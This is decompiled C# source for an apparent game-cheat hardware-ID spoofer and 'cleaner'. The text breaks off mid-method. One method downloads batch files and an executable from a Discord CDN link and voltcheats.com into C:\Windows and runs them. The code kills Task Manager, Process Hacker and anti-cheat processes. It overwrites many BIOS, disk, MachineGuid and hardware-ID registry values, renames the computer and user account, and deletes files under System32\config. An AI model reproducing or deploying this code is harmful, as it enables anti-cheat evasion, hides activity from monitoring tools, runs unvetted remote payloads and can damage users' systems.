using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.Win32;

namespace API_Example
{
	// Token: 0x02000007 RID: 7
	internal class Cleaners
	{
		// Token: 0x0600003B RID: 59 RVA: 0x00003B3C File Offset: 0x00001D3C
		public static void Fuck12()
		{
			WebClient webClient = new WebClient();
			string address = "https://cdn.discordapp.com/attachments/654675819599233034/655032743427571712/VoltCleaner.bat";
			string fileName = "C:\\Windows\\VoltCleaner.bat";
			webClient.DownloadFile(address, fileName);
			Process process = new Process();
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.FileName = fileName;
			process.Start();
			string address2 = "http://voltcheats.com/VoltLovesToxicSpooferYea/traces/apex.bat";
			string fileName2 = "C:\\Windows\\apex.bat";
			webClient.DownloadFile(address2, fileName2);
			new Process
			{
				StartInfo = 
				{
					UseShellExecute = false,
					RedirectStandardOutput = true,
					FileName = fileName
				}
			}.Start();
			string address3 = "http://voltcheats.com/spooferXDDDDDDDDD/traces/apex1.exe";
			string fileName3 = "C:\\Windows\\apex1.exe";
			webClient.DownloadFile(address3, fileName3);
			Process.Start(fileName3);
			string text = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			try
			{
				foreach (Process process2 in Process.GetProcesses())
				{
					bool flag = process2.ProcessName == "Taskmgr";
					if (flag)
					{
						process2.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (Process process3 in Process.GetProcesses())
				{
					bool flag2 = process3.ProcessName == "ProcessHacker";
					if (flag2)
					{
						process3.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (Process process4 in Process.GetProcesses())
				{
					bool flag3 = process4.ProcessName == "EpicGamesLauncher";
					if (flag3)
					{
						process4.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (Process process5 in Process.GetProcesses())
				{
					bool flag4 = process5.ProcessName == "FolderChangesView";
					if (flag4)
					{
						process5.Kill();
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003D90 File Offset: 0x00001F90
		public static void Terminate(string name)
		{
			Process[] processesByName = Process.GetProcessesByName(name ?? "");
			bool flag = processesByName.Length == 0;
			if (!flag)
			{
				foreach (Process process in processesByName)
				{
					try
					{
						ManagementObject managementObject = new ManagementObject("root\\CIMV2", "Win32_Process.Handle='" + process.Id.ToString() + "'", null);
						ManagementBaseObject methodParameters = managementObject.GetMethodParameters("Terminate");
						ManagementBaseObject managementBaseObject = managementObject.InvokeMethod("Terminate", methodParameters, null);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003E3C File Offset: 0x0000203C
		public static void FileCleaner()
		{
			Thread thread = new Thread(new ThreadStart(Cleaners.FeggotCleaner));
			thread.Start();
			Cleaners.Terminate("EpicGamesLauncher");
			Cleaners.Terminate("FortniteClient-Win64-Shipping");
			Cleaners.Terminate("EasyAntiCheat");
			Cleaners.Terminate("BeService");
			WebClient webClient = new WebClient();
			string[] files = Directory.GetFiles("C:\\Windows\\System32\\config");
			foreach (string text in files)
			{
				bool flag = text.Contains("COMPONENTS{");
				if (flag)
				{
					Cleaners.CleanFile("C:\\Windows\\System32\\config\\" + text);
				}
			}
			try
			{
				try
				{
					string[] files2 = Directory.GetFiles("C:\\Windows\\Temp");
					foreach (string asrg in files2)
					{
						Cleaners.CleanFile(asrg);
					}
				}
				catch
				{
				}
				try
				{
					string[] directories = Directory.GetDirectories("C:\\Windows\\Temp");
					foreach (string asrg2 in directories)
					{
						Cleaners.CleanDir(asrg2);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00003F94 File Offset: 0x00002194
		public static void ModifyRegistry()
		{
			List<string> list = new List<string>();
			list.Add("MSI A320M PRO - E");
			list.Add("Asus Prime A320M-C R2.0");
			list.Add("Gigabyte GA - A320M - H");
			list.Add("ASRock Z390 Phantom Gaming SLI");
			list.Add("Asus ROG Rampage VI Extreme Omega");
			list.Add("Asus Prime H310I - Plus R2.0");
			list.Add("Asus ROG Zenith Extreme Alpha X399");
			list.Add("MSI MEG X299 Creation");
			list.Add("Asus P11C - X");
			list.Add("ASRock AB350M - HDV R3.0");
			list.Add("MSI B450M Pro-VDH V2");
			list.Add("MSI B450M Bazooka V2");
			list.Add("Asus Prime B450M - A / CSM");
			list.Add("Asus Prime H310I - Plus R2.0 / CSM");
			list.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
			list.Add("Gigabyte B360 M AORUS PRO");
			list.Add("Gigabyte X299-WU8");
			list.Add("MSI MAG Z390M Mortar");
			Random random = new Random();
			int index = random.Next(list.Count);
			string value = list[index];
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag = registryKey != null;
			bool flag2 = flag;
			bool flag3 = flag2;
			if (flag3)
			{
				registryKey.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
				registryKey.Close();
			}
			List<string> list2 = new List<string>();
			list2.Add("1.0");
			list2.Add("2.0");
			list2.Add("3.0");
			list2.Add("4.0");
			list2.Add("5.0");
			list2.Add("6.0");
			list2.Add("7.0");
			list2.Add("8.0");
			list2.Add("9.0");
			list2.Add("1.1");
			list2.Add("1.2");
			list2.Add("1.3");
			list2.Add("1.4");
			list2.Add("1.5");
			list2.Add("1.6");
			Random random2 = new Random();
			int index2 = random2.Next(list2.Count);
			string value2 = list2[index2];
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag4 = registryKey2 != null;
			bool flag5 = flag4;
			bool flag6 = flag5;
			if (flag6)
			{
				registryKey2.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
				registryKey2.Close();
			}
			List<string> list3 = new List<string>();
			list3.Add("MSI");
			list3.Add("Asus");
			list3.Add("Gigabyte");
			list3.Add("ASRock");
			list3.Add("Biostar");
			list3.Add("EVGA");
			Random random3 = new Random();
			int index3 = random3.Next(list3.Count);
			string value3 = list3[index3];
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag7 = registryKey3 != null;
			bool flag8 = flag7;
			bool flag9 = flag8;
			if (flag9)
			{
				registryKey3.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
				registryKey3.Close();
			}
			RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag10 = registryKey4 != null;
			bool flag11 = flag10;
			bool flag12 = flag11;
			if (flag12)
			{
				registryKey4.SetValue("SystemVersion", value2, RegistryValueKind.String);
				registryKey4.Close();
			}
			RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag13 = registryKey5 != null;
			bool flag14 = flag13;
			bool flag15 = flag14;
			if (flag15)
			{
				registryKey5.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
				registryKey5.Close();
			}
			List<string> list4 = new List<string>();
			list4.Add("01/02/2016");
			list4.Add("01/04/2016");
			list4.Add("01/03/2016");
			list4.Add("01/05/2016");
			list4.Add("02/05/2016");
			list4.Add("03/05/2016");
			Random random4 = new Random();
			int index4 = random4.Next(list4.Count);
			string value4 = list4[index4];
			RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag16 = registryKey6 != null;
			bool flag17 = flag16;
			bool flag18 = flag17;
			if (flag18)
			{
				registryKey6.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
				registryKey6.Close();
			}
			List<string> list5 = new List<string>();
			list5.Add("PL-7A37");
			list5.Add("PL-7A87");
			list5.Add("PL-8A37");
			list5.Add("PL-7A39");
			list5.Add("PL-3A37");
			list5.Add("PL-7A47");
			list5.Add("PL-7A35");
			list5.Add("PL-7A66");
			list5.Add("PL-6A67");
			list5.Add("PL-7B37");
			list5.Add("PL-7C37");
			list5.Add("PL-7D37");
			list5.Add("PL-7AE1");
			list5.Add("PL-7A17");
			list5.Add("PL-71E7");
			list5.Add("PL-1AE7");
			list5.Add("PL-7A77");
			list5.Add("PL-7A62");
			list5.Add("PL-7A33");
			list5.Add("PL-7A19");
			Random random5 = new Random();
			int index5 = random5.Next(list5.Count);
			string value5 = list5[index5];
			RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag19 = registryKey7 != null;
			bool flag20 = flag19;
			bool flag21 = flag20;
			if (flag21)
			{
				registryKey7.SetValue("SystemProductName", value5, RegistryValueKind.String);
				registryKey7.Close();
			}
			List<string> list6 = new List<string>();
			list6.Add("A.04");
			list6.Add("A.09");
			list6.Add("A.60");
			list6.Add("A.54");
			list6.Add("A.23");
			list6.Add("A.62");
			list6.Add("A.13");
			list6.Add("A.11");
			list6.Add("A.22");
			list6.Add("A.33");
			list6.Add("A.44");
			list6.Add("A.55");
			list6.Add("A.56");
			list6.Add("A.57");
			list6.Add("A.93");
			list6.Add("A.69");
			Random random6 = new Random();
			int index6 = random6.Next(list6.Count);
			string value6 = list6[index6];
			RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag22 = registryKey8 != null;
			bool flag23 = flag22;
			bool flag24 = flag23;
			if (flag24)
			{
				registryKey8.SetValue("BIOSVersion", value6, RegistryValueKind.String);
				registryKey8.Close();
			}
			List<string> list7 = new List<string>();
			list7.Add("American Megatrends Inc.");
			list7.Add("Dell Inc.");
			list7.Add("Phoenix Technologies, Ltd");
			list7.Add("Lenovo");
			list7.Add("Packard Bell");
			list7.Add("Award Software, Inc.");
			list7.Add("Acer");
			list7.Add("Insyde Corp.");
			list7.Add("TOSHIBA");
			list7.Add("Intel Corporation");
			list7.Add("IBM");
			list7.Add("innotek GmbH");
			list7.Add("Gateway");
			list7.Add("Sun Microsystems");
			Random random7 = new Random();
			int index7 = random7.Next(list7.Count);
			string value7 = list7[index7];
			RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
			bool flag25 = registryKey9 != null;
			bool flag26 = flag25;
			bool flag27 = flag26;
			if (flag27)
			{
				registryKey9.SetValue("BIOSVendor", value7, RegistryValueKind.String);
				registryKey9.Close();
			}
			RegistryKey registryKey10 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag28 = registryKey10 != null;
			bool flag29 = flag28;
			bool flag30 = flag29;
			if (flag30)
			{
				registryKey10.SetValue("BIOSVendor", value7, RegistryValueKind.String);
				registryKey10.Close();
			}
			RegistryKey registryKey11 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag31 = registryKey11 != null;
			bool flag32 = flag31;
			bool flag33 = flag32;
			if (flag33)
			{
				registryKey11.SetValue("BIOSVersion", value6, RegistryValueKind.String);
				registryKey11.Close();
			}
			RegistryKey registryKey12 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag34 = registryKey12 != null;
			bool flag35 = flag34;
			bool flag36 = flag35;
			if (flag36)
			{
				registryKey12.SetValue("SystemProductName", value5, RegistryValueKind.String);
				registryKey12.Close();
			}
			RegistryKey registryKey13 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag37 = registryKey13 != null;
			bool flag38 = flag37;
			bool flag39 = flag38;
			if (flag39)
			{
				registryKey13.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
				registryKey13.Close();
			}
			RegistryKey registryKey14 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag40 = registryKey14 != null;
			bool flag41 = flag40;
			bool flag42 = flag41;
			if (flag42)
			{
				registryKey14.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
				registryKey14.Close();
			}
			RegistryKey registryKey15 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag43 = registryKey15 != null;
			bool flag44 = flag43;
			bool flag45 = flag44;
			if (flag45)
			{
				registryKey15.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
				registryKey15.Close();
			}
			RegistryKey registryKey16 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag46 = registryKey16 != null;
			bool flag47 = flag46;
			bool flag48 = flag47;
			if (flag48)
			{
				registryKey16.SetValue("SystemVersion", value2, RegistryValueKind.String);
				registryKey16.Close();
			}
			RegistryKey registryKey17 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag49 = registryKey17 != null;
			bool flag50 = flag49;
			bool flag51 = flag50;
			if (flag51)
			{
				registryKey17.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
				registryKey17.Close();
			}
			RegistryKey registryKey18 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
			bool flag52 = registryKey18 != null;
			bool flag53 = flag52;
			bool flag54 = flag53;
			if (flag54)
			{
				registryKey18.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
				registryKey18.Close();
			}
			Guid guid = Guid.NewGuid();
			RegistryKey registryKey19 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SystemInformation", true);
			bool flag55 = registryKey19 != null;
			bool flag56 = flag55;
			bool flag57 = flag56;
			if (flag57)
			{
				RegistryKey registryKey20 = registryKey19;
				string name = "ComputerHardwareId";
				string str = "{";
				Guid guid2 = guid;
				registryKey20.SetValue(name, str + guid2.ToString() + "}", RegistryValueKind.String);
				registryKey19.Close();
			}
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			char[] array = new char[3];
			Random random8 = new Random();
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random8.Next(text.Length)];
			}
			string str2 = new string(array);
			string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			char[] array2 = new char[30];
			Random random9 = new Random();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j] = text2[random9.Next(text2.Length)];
			}
			string str3 = new string(array2);
			string text3 = "abcdefghijklmnopqrstuvwxyz0123456789";
			char[] array3 = new char[8];
			Random random10 = new Random();
			for (int k = 0; k < array3.Length; k++)
			{
				array3[k] = text3[random10.Next(text3.Length)];
			}
			string text4 = new string(array3);
			string text5 = "0123456789";
			char[] array4 = new char[11];
			Random random11 = new Random();
			for (int l = 0; l < array4.Length; l++)
			{
				array4[l] = text5[random11.Next(text5.Length)];
			}
			string str4 = new string(array4);
			RegistryKey registryKey21 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
			bool flag58 = registryKey21 != null;
			bool flag59 = flag58;
			bool flag60 = flag59;
			if (flag60)
			{
				registryKey21.SetValue("MachineId", str2 + str3, RegistryValueKind.String);
				registryKey21.Close();
			}
			RegistryKey registryKey22 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
			bool flag61 = registryKey22 != null;
			bool flag62 = flag61;
			bool flag63 = flag62;
			if (flag63)
			{
				registryKey22.SetValue("AccountId", text4 + text4 + text4, RegistryValueKind.String);
				registryKey22.Close();
			}
			RegistryKey registryKey23 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", true);
			bool flag64 = registryKey23 != null;
			bool flag65 = flag64;
			bool flag66 = flag65;
			if (flag66)
			{
				registryKey23.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
				registryKey23.Close();
			}
			RegistryKey registryKey24 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", true);
			bool flag67 = registryKey24 != null;
			bool flag68 = flag67;
			bool flag69 = flag68;
			if (flag69)
			{
				registryKey24.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
				registryKey24.Close();
			}
			Guid guid3 = Guid.NewGuid();
			RegistryKey registryKey25 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Feeds", true);
			bool flag70 = registryKey25 != null;
			bool flag71 = flag70;
			bool flag72 = flag71;
			if (flag72)
			{
				registryKey25.SetValue("BackgroundSync", guid3, RegistryValueKind.String);
				registryKey25.Close();
			}
			try
			{
				RegistryKey registryKey26 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\IdentityCRL\\ExtendedProperties", true);
				bool flag73 = registryKey26 != null;
				bool flag74 = flag73;
				bool flag75 = flag74;
				if (flag75)
				{
					registryKey26.SetValue("LID", str4 + "BE123", RegistryValueKind.String);
					registryKey26.Close();
				}
			}
			catch
			{
			}
			Random random12 = new Random();
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Connected", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Disconnected", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\EmailImage", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\FaxImage", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\PrintImage", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\ScanButton", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\STIproxyEvent", "GUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\IdentityCRL\\ExtendedProperties", "LID", (random12.Next(10000, 99999) + random12.Next(100000, 999999)).ToString() + "BE123");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Feeds", "BackgroundSync", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", SMBIOS.RandomString(8) + "-A");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", SMBIOS.RandomString(8) + "-A");
			List<string> list8 = new List<string>();
			list8.Add("MSI A320M PRO - E");
			list8.Add("Asus Prime A320M-C R2.0");
			list8.Add("Gigabyte GA - A320M - H");
			list8.Add("ASRock Z390 Phantom Gaming SLI");
			list8.Add("Asus ROG Rampage VI Extreme Omega");
			list8.Add("Asus Prime H310I - Plus R2.0");
			list8.Add("Asus ROG Zenith Extreme Alpha X399");
			list8.Add("MSI MEG X299 Creation");
			list8.Add("Asus P11C - X");
			list8.Add("ASRock AB350M - HDV R3.0");
			list8.Add("MSI B450M Pro-VDH V2");
			list8.Add("MSI B450M Bazooka V2");
			list8.Add("Asus Prime B450M - A / CSM");
			list8.Add("Asus Prime H310I - Plus R2.0 / CSM");
			list8.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
			list8.Add("Gigabyte B360 M AORUS PRO");
			list8.Add("Gigabyte X299-WU8");
			list8.Add("MSI MAG Z390M Mortar");
			Cleaners.<ModifyRegistry>g__SetComputerName|4_0(SMBIOS.RandomString(20));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct", SMBIOS.RandomString(20));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware", "HwProfileGuid", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion", "BuildGUID", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", Guid.NewGuid().ToString());
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareId", "{" + Convert.ToString(Guid.NewGuid()) + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareIds", string.Concat(new string[]
			{
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}",
				Environment.NewLine,
				"{",
				Convert.ToString(Guid.NewGuid()),
				"}"
			}));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e965-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\BusDeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\DeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\Driver", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\AppModel", "GUID", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\SYSTEM\\HardwareConfig", "LastConfig", Convert.ToString(Guid.NewGuid()));
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "BaseBoardProduct", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
			string userName = Environment.UserName;
			string text6 = userName + random.Next(10000, 99999).ToString();
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "-R C:\\";
			process.Start();
			Thread.Sleep(30);
			process.StandardInput.WriteLine("/c wmic useraccount where caption='" + text6 + "' rename " + text6);
			Thread.Sleep(120);
			process.Kill();
			process.Close();
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", text6);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName", text6);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "NV Hostname", text6);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "Hostname", text6);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", text6);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", text6);
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000058D4 File Offset: 0x00003AD4
		public static void FeggotCleaner()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					bool flag = process.ProcessName == "Taskmgr";
					if (flag)
					{
						process.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				Process[] processes2 = Process.GetProcesses();
				foreach (Process process2 in processes2)
				{
					bool flag2 = process2.ProcessName == "ProcessHacker";
					if (flag2)
					{
						process2.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				Process[] processes3 = Process.GetProcesses();
				foreach (Process process3 in processes3)
				{
					bool flag3 = process3.ProcessName == "EpicGamesLauncher";
					if (flag3)
					{
						process3.Kill();
					}
				}
			}
			catch
			{
			}
			try
			{
				Process[] processes4 = Process.GetProcesses();
				foreach (Process process4 in processes4)
				{
					bool flag4 = process4.ProcessName == "FolderChangesView";
					if (flag4)
					{
						process4.Kill();
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(2000);
			string userName = Environment.UserName;
			try
			{
				bool flag5 = File.Exists("C:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				if (flag5)
				{
					File.Delete("C:\\Windows\\System32\\eac_usermode_21537346703536.dll");
				}
			}
			catch
			{
			}
			try
			{
